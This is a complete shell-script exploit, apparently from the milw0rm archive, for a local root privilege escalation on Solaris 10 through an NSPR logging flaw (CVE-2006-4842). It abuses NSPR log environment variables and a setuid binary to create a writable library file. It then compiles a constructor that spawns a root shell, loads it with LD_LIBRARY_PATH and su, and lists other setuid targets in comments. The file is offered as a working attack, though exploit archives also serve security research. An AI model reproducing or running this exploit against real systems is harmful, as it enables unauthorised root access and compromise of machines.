#!/bin/sh

#
# $Id: raptor_libnspr3,v 1.1 2006/10/24 15:54:57 raptor Exp $
#
# raptor_libnspr3 - Solaris 10 libnspr constructor exploit
# Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Local exploitation of a design error vulnerability in version 4.6.1 of 
# NSPR, as included with Sun Microsystems Solaris 10, allows attackers to 
# create or overwrite arbitrary files on the system. The problem exists 
# because environment variables are used to create log files. Even when the
# program is setuid, users can specify a log file that will be created with 
# elevated privileges (CVE-2006-4842).
#
# Yet another newschool version of the local root exploit: this time we place
# our code in the global constructor (ctors) for the library, as suggested by
# gera. This way, we don't have to hide a real function and we have a generic
# library that can be used in all exploits like this. To avoid annoying side-
# effects, i use trusted directories and LD_LIBRARY_PATH instead of replacing
# a library in the default search path.
#
# See also:
# http://www.0xdeadbeef.info/exploits/raptor_libnspr
# http://www.0xdeadbeef.info/exploits/raptor_libnspr2
#
# Usage:
# $ chmod +x raptor_libnspr3
# $ ./raptor_libnspr3
# [...]
# Sun Microsystems Inc.   SunOS 5.10      Generic January 2005
# # id
# uid=0(root) gid=1(other)
# # rm /usr/lib/secure/libldap.so.5
# #
#
# Vulnerable platforms (SPARC):
# Solaris 10 without patch 119213-10 [tested]
#
# Vulnerable platforms (x86):
# Solaris 10 without patch 119214-10 [untested]
#

echo "raptor_libnspr3 - Solaris 10 libnspr constructor exploit"
echo "Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"
echo

# prepare the environment
NSPR_LOG_MODULES=all:5
NSPR_LOG_FILE=/usr/lib/secure/libldap.so.5
export NSPR_LOG_MODULES NSPR_LOG_FILE

# gimme -rw-rw-rw-!
umask 0

# setuid program linked to /usr/lib/mps/libnspr4.so
/usr/bin/chkey

# other good setuid targets
#/usr/bin/passwd
#/usr/bin/lp
#/usr/bin/cancel
#/usr/bin/lpset
#/usr/bin/lpstat
#/usr/lib/lp/bin/netpr
#/usr/sbin/lpmove
#/usr/bin/su
#/usr/bin/mailq

# prepare the evil shared library
echo "void __attribute__ ((constructor)) cons() {"     > /tmp/ctors.c
echo "        setuid(0);"                             >> /tmp/ctors.c
echo "        execle(\"/bin/ksh\", \"ksh\", 0, 0);"   >> /tmp/ctors.c
echo "}"                                              >> /tmp/ctors.c
gcc -fPIC -g -O2 -shared -o /usr/lib/secure/libldap.so.5 /tmp/ctors.c -lc
if [ $? -ne 0 ]; then
	echo "problems compiling evil shared library, check your gcc"
	exit 1
fi

# newschool LD_LIBRARY_PATH foo;)
unset NSPR_LOG_MODULES NSPR_LOG_FILE
LD_LIBRARY_PATH=/usr/lib/secure su -

# milw0rm.com [2006-10-24]
